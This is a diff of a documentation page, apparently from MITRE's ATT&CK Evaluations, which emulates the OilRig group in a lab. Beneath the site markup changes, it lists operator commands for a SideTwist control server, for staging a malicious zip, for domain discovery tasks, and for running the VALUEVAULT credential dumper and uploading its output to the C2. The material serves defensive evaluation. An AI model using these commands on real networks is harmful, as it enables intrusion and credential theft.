@@ -7,10 +7,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="turbo-root" content="/ael">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.8.1.800553374803">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.807110018169">
 
     <!-- See retype.com -->
-    <meta name="generator" content="Retype 3.8.1">
+    <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
     <title>Scenario Overview</title>
@@ -32,30 +32,30 @@
     <meta property="twitter:title" content="Scenario Overview">
     <meta property="twitter:description" content="Legend of symbols:">
 
-    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
     <link href="../../../favicon.png" rel="icon">
-    <link href="../../../resources/css/retype.css?v=3.8.1.800553374803" rel="stylesheet">
+    <link href="../../../resources/css/retype.css?v=3.11.0.807110018169" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.8.1.800553374803" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.8.1" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.8.1.800553374803" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../resources/js/prism.js?v=3.8.1.800553374803" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.11.0.807110018169" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.11.0.807110018169" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../resources/js/prism.js?v=3.11.0.807110018169" defer></script>
 </head>
 <body>
-    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
-        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
     
-        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
             <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                 <!-- Mobile menu button skeleton -->
-                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
-                <div v-cloak id="docs-sidebar-toggle"></div>
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
         
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="docs-site-logo" href="../../../" class="flex items-center leading-snug text-xl">
+                        <a id="retype-branding-logo" href="../../../" class="flex items-center leading-snug text-xl">
                             <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
                                 <img class="max-h-10 dark:hidden md:inline-block" src="../../../images/attackevals-logo.png">
                                 <img class="max-h-10 hidden dark:inline-block" src="../../../images/attackevals-logo.png">
@@ -64,15 +64,15 @@
                         </a>
                     </div>
         
-                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
                 </div>
         
                 <div class="flex justify-between md:grow">
                     <!-- Top Nav -->
-                    <nav class="hidden md:flex">
+                    <nav id="retype-header-nav" class="hidden md:flex">
                         <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                             </li>
         
                         </ul>
@@ -86,7 +86,7 @@
                             <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                 <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                             </div>
-                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                         </div>
         
                         <!-- Mobile search button -->
@@ -104,7 +104,7 @@
                     </div>
         
                     <div v-cloak class="flex justify-end grow">
-                        <div id="docs-mobile-search-button"></div>
+                        <div id="retype-mobile-search-button"></div>
                         <doc-search-desktop></doc-search-desktop>
         
                         <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
@@ -114,21 +114,22 @@
             </div>
         </header>
     
-        <div class="container relative flex bg-white">
+    
+        <div id="retype-container" class="container relative flex bg-white">
             <!-- Sidebar Skeleton -->
-            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-white border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
             
                 <div class="flex items-center h-16 px-6">
-                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
                 </div>
             
                 <div class="pl-6 mt-1 mb-4">
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                 </div>
             
             </div>
@@ -136,13 +137,13 @@
             <!-- Sidebar component -->
             <doc-sidebar v-cloak>
                 <template #sidebar-footer>
-                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
             
-                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
                             <nav>
                                 <ul class="flex flex-wrap justify-center items-center">
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                                     </li>
             
                                 </ul>
@@ -152,15 +153,15 @@
                 </template>
             </doc-sidebar>
     
-            <div class="grow min-w-0 dark:bg-dark-850">
+            <div class="grow min-w-0 bg-body-bg">
                 <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                 <div class="flex">
-                    <div class="min-w-0 p-4 grow md:px-16">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
                         <main class="relative pb-12 lg:pt-2">
-                            <div class="docs-markdown" id="docs-content">
+                            <div class="retype-markdown" id="retype-content">
                                 <!-- Rendered if sidebar right is enabled -->
-                                <div id="docs-sidebar-right-toggle"></div>
-                                <nav class="breadcrumb" aria-label="Breadcrumb">
+                                <div id="retype-sidebar-right-toggle"></div>
+                                <nav id="retype-breadcrumb" class="breadcrumb" aria-label="Breadcrumb">
                                     <ol role="list">
                                         <li class="pr-4">
                                             <a href="../../../" class="pr-4">
@@ -201,7 +202,7 @@
         <span>Scenario Overview</span>
     </h1>
 </doc-anchor-target>
-<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
+<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center print:justify-center">
     <div>In&nbsp;</div>
     <div><a href="../../categories/managed-services/">Managed-Services</a></div>
 </div>
@@ -235,9 +236,9 @@ out-of-scope jump box</p>
         <span>Step 0 - Setup</span>
     </h2>
 </doc-anchor-target>
-<doc-anchor-target id="voice-track">
+<doc-anchor-target id="microphone-voice-track">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microphone-voice-track">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
     </h3>
 </doc-anchor-target>
@@ -249,9 +250,9 @@ to a registered implant will simply return the dummy page.</p>
 <p>The malicious document is delivered from a separate attacking machine running
 postfix.</p>
 <hr>
-<doc-anchor-target id="procedures">
+<doc-anchor-target id="-procedures">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#-procedures">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
     </h3>
 </doc-anchor-target>
@@ -262,17 +263,17 @@ postfix.</p>
 </li>
 </ul>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">cd /opt/oilrig/Resources/control_server</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">cd /opt/oilrig/Resources/control_server</code></pre>
 </doc-codeblock></div>
 <ul>
 <li>Ensure the SideTwist handler is enabled for the server:</li>
 </ul>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">tail -n 5 ./config/handler_config.yml</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">tail -n 5 ./config/handler_config.yml</code></pre>
 </doc-codeblock></div>
 <p>Result:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">sidetwist:
+<pre translate="no" class="language-none"><code v-pre class="language-none">sidetwist:
   host: 192.168.0.4
   port: 443
   enabled: true</code></pre>
@@ -283,7 +284,7 @@ postfix.</p>
 <li>Start the control server:</li>
 </ul>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">sudo ./controlServer</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">sudo ./controlServer</code></pre>
 </doc-codeblock></div>
 <ul>
 <li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> SSH to the Mail and Apache Server <code v-pre>192.168.0.5</code> to ensure the malicious
@@ -293,7 +294,7 @@ document (<code v-pre>Marketing_Materials.zip</code>) is in /var/www/html.</p>
 </li>
 </ul>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">ls /var/www/html</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">ls /var/www/html</code></pre>
 </doc-codeblock></div>
 <p><span class="docs-emoji">&#x1F4A1;</span> If the armed and zipped file is not there, follow the <a href="../resources/sidetwist_dropper/">instructions</a>
 for creating it then copy the zip file to <code v-pre>/var/www/html</code>.</p>
@@ -301,7 +302,7 @@ for creating it then copy the zip file to <code v-pre>/var/www/html</code>.</p>
 <li>Restart the Apache and Postfix services to ensure they are fresh:</li>
 </ul>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">systemctl restart apache2
+<pre translate="no" class="language-none"><code v-pre class="language-none">systemctl restart apache2
 systemctl restart postfix</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="step-1---initial-compromise-and-persistence">
@@ -310,9 +311,9 @@ systemctl restart postfix</code></pre>
         <span>Step 1 - Initial Compromise and Persistence</span>
     </h2>
 </doc-anchor-target>
-<doc-anchor-target id="voice-track">
+<doc-anchor-target id="microphone-voice-track-1">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microphone-voice-track-1">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
     </h3>
 </doc-anchor-target>
@@ -339,15 +340,17 @@ additional empty file that, if not present, SideTwist will terminate automatical
 </ol>
 <p>When <code v-pre>SystemFailureReporter.exe</code> runs:</p>
 <ol start="8">
-<li><code v-pre>SystemFailureReporter.exe</code> uses the GetUserName API, GetComputerName API, and
-GetDomainName API to find the current user, hostname, and domain respectively.</li>
-<li><code v-pre>SystemFailureReporter.exe</code> connects to the control server (192.168.0.4) over
-XOR encrypted protocol HTTP on port 443.</li>
+<li><p><code v-pre>SystemFailureReporter.exe</code> uses the GetUserName API, GetComputerName API, and
+GetDomainName API to find the current user, hostname, and domain respectively.</p>
+</li>
+<li><p><code v-pre>SystemFailureReporter.exe</code> connects to the control server (192.168.0.4) over
+XOR encrypted protocol HTTP on port 443.</p>
+</li>
 </ol>
 <hr>
-<doc-anchor-target id="procedures">
+<doc-anchor-target id="-procedures-1">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#-procedures-1">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
     </h3>
 </doc-anchor-target>
@@ -406,9 +409,9 @@ content&quot;.</p>
 document is closed.</li>
 </ul>
 <br>
-<doc-anchor-target id="source-code">
+<doc-anchor-target id="moyai-source-code">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#moyai-source-code">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
     </h3>
 </doc-anchor-target>
@@ -431,9 +434,9 @@ document is closed.</li>
 <li>SideTwist XOR key: <a href="../resources/sidetwist/sidetwist/comms.h#L23">comms.h#L23</a></li>
 </ul>
 <br>
-<doc-anchor-target id="cited-intelligence">
+<doc-anchor-target id="microscope-cited-intelligence">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microscope-cited-intelligence">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
     </h3>
 </doc-anchor-target>
@@ -448,9 +451,9 @@ document is closed.</li>
         <span>Step 2 - Workstation Discovery</span>
     </h2>
 </doc-anchor-target>
-<doc-anchor-target id="voice-track">
+<doc-anchor-target id="microphone-voice-track-2">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microphone-voice-track-2">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
     </h3>
 </doc-anchor-target>
@@ -465,9 +468,9 @@ registry key value to check if RDP is enabled.</p>
 is part of the <code v-pre>Exchange Trusted Subsystem</code> group, and the existence of several
 other administrator groups, including <code v-pre>SQL Admins</code> of which user <code v-pre>tous</code> is a member.</p>
 <hr>
-<doc-anchor-target id="procedures">
+<doc-anchor-target id="-procedures-2">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#-procedures-2">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
     </h3>
 </doc-anchor-target>
@@ -478,7 +481,7 @@ terminal window horizontally, being careful to not terminate the server.</p>
 waiting until each task is accomplished before teeing the next one.</p>
 <p><span class="docs-emoji">&#x1F4A1;</span> The implant will execute every 5 minutes.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># Helminth has been observed to perform initial information gathering on systems, including the enumeration of the current user, accounts, groups, system information, network connections, processes, services, and if remote desktop is enabled.
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># Helminth has been observed to perform initial information gathering on systems, including the enumeration of the current user, accounts, groups, system information, network connections, processes, services, and if remote desktop is enabled.
 
 ./evalsC2client.py --set-task goTb '101 whoami &amp; hostname &amp; ipconfig /all &amp; net user /domain 2&gt;&amp;1 &amp; net group /domain 2&gt;&amp;1 &amp; net group &quot;domain admins&quot; /domain 2&gt;&amp;1 &amp; net group &quot;Exchange Trusted Subsystem&quot; /domain 2&gt;&amp;1 &amp; net accounts /domain 2&gt;&amp;1 &amp; net user 2&gt;&amp;1 &amp; net localgroup administrators 2&gt;&amp;1 &amp; netstat -an 2&gt;&amp;1 &amp; tasklist 2&gt;&amp;1 &amp; sc query 2&gt;&amp;1 &amp; systeminfo 2&gt;&amp;1 &amp; reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; 2&gt;&amp;1'</code></pre>
 </doc-codeblock></div>
@@ -486,14 +489,14 @@ waiting until each task is accomplished before teeing the next one.</p>
 member of EWS Administrators, tous is a SQL administrator and the IP of
 WATERFALLS.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># OilRig has been observed to perform enumeration of users and groups.[3]
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># OilRig has been observed to perform enumeration of users and groups.[3]
 
 ./evalsC2client.py --set-task goTb '101 net user gosta /domain 2&gt;&amp;1 &amp; net group &quot;SQL Admins&quot; /domain 2&gt;&amp;1 &amp; nslookup WATERFALLS 2&gt;&amp;1'</code></pre>
 </doc-codeblock></div>
 <br>
-<doc-anchor-target id="source-code">
+<doc-anchor-target id="moyai-source-code-1">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#moyai-source-code-1">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
     </h3>
 </doc-anchor-target>
@@ -502,9 +505,9 @@ WATERFALLS.</p>
 <li>SideTwist command execution: <a href="../resources/sidetwist/sidetwist/sidetwist.cpp#L102-L114/">SideTwist.cpp#L102-L114</a></li>
 </ul>
 <br>
-<doc-anchor-target id="cited-intelligence">
+<doc-anchor-target id="microscope-cited-intelligence-1">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microscope-cited-intelligence-1">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
     </h3>
 </doc-anchor-target>
@@ -521,9 +524,9 @@ WATERFALLS.</p>
         <span>Step 3 - Workstation Low Privilege Credential Dumping</span>
     </h2>
 </doc-anchor-target>
-<doc-anchor-target id="voice-track">
+<doc-anchor-target id="microphone-voice-track-3">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microphone-voice-track-3">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
     </h3>
 </doc-anchor-target>
@@ -534,41 +537,41 @@ VALUEVAULT dump (named <code v-pre>fsociety.dat</code>) back to C2 via HTTP POST
 <p>The output of the credential dump provides a plaintext password for the current
 user <code v-pre>gosta</code>.</p>
 <hr>
-<doc-anchor-target id="procedures">
+<doc-anchor-target id="-procedures-3">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#-procedures-3">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
     </h3>
 </doc-anchor-target>
 <p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> On Linux Attack Platform  as <code v-pre>saka</code>, issue the command to download VALUEVAULT
 to the workstation</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '102 C:\Users\gosta\AppData\Roaming\b.exe|b.exe'</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '102 C:\Users\gosta\AppData\Roaming\b.exe|b.exe'</code></pre>
 </doc-codeblock></div>
 <p>Issue the command to execute VALUEVAULT after it has been downloaded:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '101 C:\Users\gosta\AppData\Roaming\b.exe'</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '101 C:\Users\gosta\AppData\Roaming\b.exe'</code></pre>
 </doc-codeblock></div>
 <p>Issue the command to upload output of VALUEVAULT to C2 after it has executed:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '103 C:\Users\gosta\AppData\Roaming\fsociety.dat'</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '103 C:\Users\gosta\AppData\Roaming\fsociety.dat'</code></pre>
 </doc-codeblock></div>
 <p>Confirm that the credentials were obtained on C2 server.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">ls ./files
+<pre translate="no" class="language-none"><code v-pre class="language-none">ls ./files
 cat ./files/fsociety.dat</code></pre>
 </doc-codeblock></div>
 <br>
-<doc-anchor-target id="source-code">
+<doc-anchor-target id="moyai-source-code-2">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#moyai-source-code-2">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
     </h3>
 </doc-anchor-target>
 <ul>
-<li>SideTwist file download: <a href="../resources/sidetwist/sidetwist/sidetwist.cpp#L129-L154">SideTwist.cpp#L129-L154</a> and <a href="..//Resources/SideTwist/SideTwist/comms.cpp#L78-L97" class="outbound" target="_blank"><span>comms.cpp#L78-L9</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>SideTwist file download: <a href="../resources/sidetwist/sidetwist/sidetwist.cpp#L129-L154">SideTwist.cpp#L129-L154</a> and <a href="..//Resources/SideTwist/SideTwist/comms.cpp#L78-L97" class="outbound" target="_blank"><span>comms.cpp#L78-L9</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
 <li>SideTwist file upload: <a href="../resources/sidetwist/sidetwist/sidetwist.cpp#L166-L178/">SideTwist.cpp#L166-L178</a>,
-and <a href="../resources/sidetwist/sidetwist/sidetwist.cpp#L81">SideTwist.cpp#L81</a> -&gt; <a href="..//Resources/SideTwist/SideTwist/comms.cpp#L113-L124" class="outbound" target="_blank"><span>comms.cpp#L113-L12</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> -&gt; <a href=".././resources/sidetwist/sidetwist/comms.cpp#L172-L294">comms.cpp#L172-L2</a></li>
